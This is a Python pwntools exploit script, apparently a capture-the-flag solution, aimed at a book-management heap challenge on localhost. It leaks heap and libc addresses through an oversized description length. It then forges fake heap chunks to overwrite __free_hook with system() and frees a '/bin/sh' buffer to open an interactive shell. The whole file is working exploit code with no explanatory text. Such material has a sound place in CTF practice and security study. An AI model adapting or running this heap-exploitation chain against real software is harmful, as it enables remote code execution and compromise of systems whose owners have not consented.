from pwn import *

context.arch = "amd64"
context.terminal = "tmux splitw -h".split()
#p = process("./chall")
p = remote("localhost", 4441)
libc = ELF("./libc.so.6", checksec=False)

cmd = ""
DEBUG = 0
if DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"]);

def goto(n):
	p.sendlineafter("> ", str(n))
	return

def create(idx, title, page, desc_len, desc):
	goto(1)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", title)
	p.sendlineafter(": ", str(page))
	p.sendlineafter(": ", str(desc_len))
	if desc:
		p.sendlineafter(": ", desc)
	return

def edit(idx, title, page, desc_len, desc):
	goto(2)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", title)
	p.sendlineafter(": ", str(page))
	p.sendlineafter(": ", str(desc_len))
	p.sendlineafter(": ", desc)
	return

def print_book(idx):
	goto(3)
	p.sendlineafter(": ", str(idx))
	return

def del_book(idx):
	goto(4)
	p.sendlineafter(": ", str(idx))
	return

create(2, "X"*23, 0x2121, 0x412, 'b')
create(1, "C"*23, 0x4141, 0x1, 'b')
create(0, "A"*23, 200, 0x28, "B"*0x28)
create(4, "K"*23, 0x1336, 1, 'x')

del_book(1)

del_book(0)
create(0, "B"*23, 0x1337, 0xffffffffffffffff, "")
print_book(0)
p.recvuntil("description : ")
heap_leak = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print(hex(heap_leak))
heap_base = heap_leak-1776
print(hex(heap_base))

del_book(2)
create(2, "D"*23, 0x1337, 0xffffffffffffffff, "")
print_book(2)
p.recvuntil("description : ")
libc_leak = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print(hex(libc_leak))

libc_base = libc_leak-0x1ebbe0
print(hex(libc_base))

del_book(4)
fake_chunk = p64(0) + p64(0x71) + p64(0) + p64(0)
create(4, "L"*23, 0x1336, 0x200, fake_chunk)
create(3, "K"*23, 0x1336, 1, 'a')
del_book(0)

fake_book = p32(0) + b"A"*24 + p32(0) + p64(heap_leak-1040)
create(5, "U"*23, 0x1337, 0x27, fake_book[:-1])
create(6, "K"*23, 0x1337, 0x60, "bbb")
del_book(6)
del_book(3)
fake_chunk2 = p64(0) + p64(0x71) + p64(libc_base + libc.symbols['__free_hook']) + p64(0)
edit(4, "L"*23, 0x1336, 0x200, fake_chunk2)
create(7, "V"*23, 0x1336, 0x60, "/bin/sh")
create(8, "hacked", 0x1337, 0x60, p64(libc_base+libc.symbols['system']))
del_book(7)

p.interactive()
